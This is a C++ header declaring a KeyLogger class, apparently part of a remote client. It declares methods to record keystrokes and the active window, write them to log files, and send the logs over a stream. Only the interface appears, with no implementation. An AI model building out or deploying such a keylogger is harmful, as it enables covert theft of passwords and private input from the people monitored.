#ifndef CLIENT_KEYLOGGER_H
#define CLIENT_KEYLOGGER_H

#include <iostream>
#include <fstream>
#include <string>
#include <fstream>
#include <atomic>
#include <thread>

#include "../stream/Stream.h"
#include "../Time/Time.h"



class KeyLogger {

public:
    explicit KeyLogger(Stream stream);
    bool isRecordingKeys() const;
    void setRecordingKeys(bool isRecording);
    void sendKeyLoggerLog();
    void sendAllKeyLoggerLogs() const;
    bool lastLogExists();
    bool logsExists();
    void tryStart();
private:
    void start();
    const std::wstring pathOfLogs= L"Logs/";
    std::wstring logsFileName= generateLogName();
    Stream stream;
    std::atomic<bool> recordingKeys = false;
    std::string tempWindow;
    std::string getCurrentWindow();
    bool checkShift();
    bool checkAltGr();
    void writeCharIntoLogFile(const char *string);
    void writeCharIntoLogFile(char string);
    std::wstring generateLogName();
};


#endif
